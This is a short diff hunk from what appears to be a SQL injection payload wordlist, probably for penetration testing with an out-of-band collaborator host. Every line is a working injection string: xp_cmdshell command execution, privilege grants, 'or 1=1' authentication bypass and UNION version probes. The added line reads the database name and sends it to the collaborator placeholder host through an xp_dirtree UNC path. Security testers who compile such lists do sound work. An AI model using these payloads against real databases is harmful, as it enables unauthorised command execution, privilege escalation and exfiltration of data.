@@ -5,6 +5,7 @@
 "; exec master..xp_cmdshell "!-VARIABLE_COLLABORATOR-!"--
 `; exec master..xp_cmdshell `!-VARIABLE_COLLABORATOR-!`--
 ' grant connect to name; grant resource to name; --
+; DECLARE @data varchar(1024);SELECT @data = (SELECT DB_NAME());exec('master.dbo.xp_dirtree \"\\\\'+@data+'.!-VARIABLE_COLLABORATOR-!\\x\"');--
 ' or 1=1 -- 
 ' union (select @@version) --
 ' union (select NULL, (select @@version)) --
